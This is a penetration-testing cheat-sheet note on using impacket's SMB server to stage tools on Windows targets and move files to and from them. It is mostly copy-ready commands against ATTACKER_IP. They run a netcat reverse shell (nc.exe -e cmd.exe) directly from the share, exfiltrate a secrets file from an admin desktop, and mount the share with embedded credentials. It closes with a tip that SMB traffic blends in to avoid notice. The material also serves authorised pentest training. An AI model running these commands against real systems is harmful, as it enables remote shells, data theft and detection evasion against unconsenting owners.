---
tags: [pentest, transfer, smb, impacket, windows, initial-access]
tool: impacket-smbserver
phase: 5
---
# SMB Server Transfer (impacket)

Host an SMB share on your attacker machine. Windows targets can copy files directly without downloading — no disk write, lives in memory.

[[00 - README|Folder index]]

## Start SMB server (attacker)

```bash
# Basic (no auth)
impacket-smbserver share /opt/tools -smb2support

# With authentication (required for Windows 10+)
impacket-smbserver share /opt/tools -smb2support -username user -password pass
```

## Copy files on target (Windows)

```cmd
:: Without auth
copy \\ATTACKER_IP\share\nc.exe C:\Windows\Temp\nc.exe

:: With auth
net use \\ATTACKER_IP\share /user:user pass
copy \\ATTACKER_IP\share\nc.exe .
net use \\ATTACKER_IP\share /delete

:: Execute directly from share (no disk write!)
\\ATTACKER_IP\share\nc.exe -e cmd.exe ATTACKER_IP 4444
```

## Exfiltrate from target

```cmd
:: Copy files TO the share
copy C:\Users\admin\Desktop\secrets.txt \\ATTACKER_IP\share\
```

## PowerShell with credentials

```powershell
$pass = ConvertTo-SecureString 'pass' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('user', $pass)
New-PSDrive -Name "X" -PSProvider FileSystem -Root "\\ATTACKER_IP\share" -Credential $cred
Copy-Item X:\tools\*.* C:\Windows\Temp\
```

> [!tip] SMB is stealthy on Windows networks
> SMB traffic is normal in corporate environments. It blends in better than HTTP downloads from random IPs.

## See also

- [[12 - Python HTTP Server Transfer]]
- [[14 - PowerShell Download Methods]]
